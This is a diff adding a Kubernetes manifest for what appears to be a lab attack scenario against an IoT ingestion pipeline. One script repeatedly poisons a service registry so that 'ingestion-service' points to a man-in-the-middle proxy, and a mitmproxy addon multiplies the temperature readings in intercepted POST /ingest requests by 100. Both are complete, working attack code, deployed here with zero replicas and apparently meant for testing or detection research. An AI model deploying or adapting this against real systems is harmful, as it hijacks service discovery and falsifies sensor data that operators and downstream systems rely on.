@@ -1,0 +1,115 @@
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: mitm-addon
+data:
+  tamper.py: |
+    import json
+    from mitmproxy import http
+
+    FACTOR = 100.0
+
+    class Tamper:
+        def request(self, flow: http.HTTPFlow) -> None:
+            if flow.request.method != "POST" or not flow.request.path.startswith("/ingest"):
+                return
+            try:
+                body = json.loads(flow.request.get_text())
+                original = body.get("temperature")
+                body["temperature"] = float(original) * FACTOR
+                flow.request.set_text(json.dumps(body))
+                print(f"[tamper] {body.get('device_id')}: {original} -> {body['temperature']}", flush=True)
+            except Exception as e:
+                print(f"[tamper] erro: {e}", flush=True)
+
+    addons = [Tamper()]
+---
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: mitm-poison
+data:
+  poison.py: |
+    import json, time, urllib.request
+
+    TARGET = "http://registry:5050/register"
+    CLAIM = {"name": "ingestion-service", "url": "http://mitm-ingest:5001"}
+
+    while True:
+        try:
+            req = urllib.request.Request(
+                TARGET,
+                data=json.dumps(CLAIM).encode(),
+                headers={"Content-Type": "application/json"},
+                method="POST",
+            )
+            urllib.request.urlopen(req, timeout=2).read()
+            print("[poison] ingestion-service -> mitm-ingest", flush=True)
+        except Exception as e:
+            print(f"[poison] falhou: {e}", flush=True)
+        time.sleep(4)
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: mitm
+  labels:
+    app: mitm
+spec:
+  replicas: 0
+  selector:
+    matchLabels:
+      app: mitm
+  template:
+    metadata:
+      labels:
+        app: mitm
+    spec:
+      nodeSelector:
+        role: worker
+      containers:
+        - name: mitm
+          image: mitmproxy/mitmproxy:latest
+          command:
+            - mitmdump
+            - --mode
+            - reverse:http://ingestion:5001
+            - --listen-host
+            - 0.0.0.0
+            - --listen-port
+            - "5001"
+            - -s
+            - /addons/tamper.py
+          ports:
+            - name: proxy
+              containerPort: 5001
+          volumeMounts:
+            - name: addon
+              mountPath: /addons
+        - name: poison
+          image: python:3.12-alpine
+          command: ["python", "/poison/poison.py"]
+          volumeMounts:
+            - name: poison
+              mountPath: /poison
+      volumes:
+        - name: addon
+          configMap:
+            name: mitm-addon
+        - name: poison
+          configMap:
+            name: mitm-poison
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: mitm-ingest
+  labels:
+    app: mitm
+spec:
+  selector:
+    app: mitm
+  ports:
+    - name: proxy
+      port: 5001
+      targetPort: 5001
